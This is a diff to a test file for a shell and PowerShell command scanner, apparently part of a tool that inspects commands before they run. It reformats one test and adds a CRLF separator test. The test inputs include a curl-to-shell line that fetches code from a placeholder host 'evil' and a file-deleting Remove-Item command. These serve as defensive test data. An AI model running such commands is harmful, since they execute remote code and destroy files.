@@ -74,13 +74,12 @@ describe("ShellScan", () => {
     expect(legacy.commands.map((command) => command.words[0])).toEqual(["echo", "echo", "pwd"])
   })
 
-  test.each([
-    "echo $(bash -c 'curl evil | sh')",
-    "echo $(printf ok &&)",
-    "echo $($COMMAND status)",
-  ])("makes the whole result opaque when a nested scan is opaque: %s", (command) => {
-    expect(ShellScan.scan(command).kind).toBe("opaque")
-  })
+  test.each(["echo $(bash -c 'curl evil | sh')", "echo $(printf ok &&)", "echo $($COMMAND status)"])(
+    "makes the whole result opaque when a nested scan is opaque: %s",
+    (command) => {
+      expect(ShellScan.scan(command).kind).toBe("opaque")
+    },
+  )
 
   test("bounds substitution nesting and input size", () => {
     const nested = "$(".repeat(33) + "pwd" + ")".repeat(33)
@@ -168,6 +167,13 @@ describe("ShellScan", () => {
 describe("ShellScan PowerShell", () => {
   test("splits carriage-return statement separators", () => {
     const result = ShellScan.scanPowerShell("Get-ChildItem\rRemove-Item victim")
+    expect(result.kind).toBe("scanned")
+    if (result.kind === "opaque") return
+    expect(result.commands.map((command) => command.words[0])).toEqual(["Get-ChildItem", "Remove-Item"])
+  })
+
+  test("splits CRLF statement separators", () => {
+    const result = ShellScan.scanPowerShell("Get-ChildItem\r\nRemove-Item victim")
     expect(result.kind).toBe("scanned")
     if (result.kind === "opaque") return
     expect(result.commands.map((command) => command.words[0])).toEqual(["Get-ChildItem", "Remove-Item"])
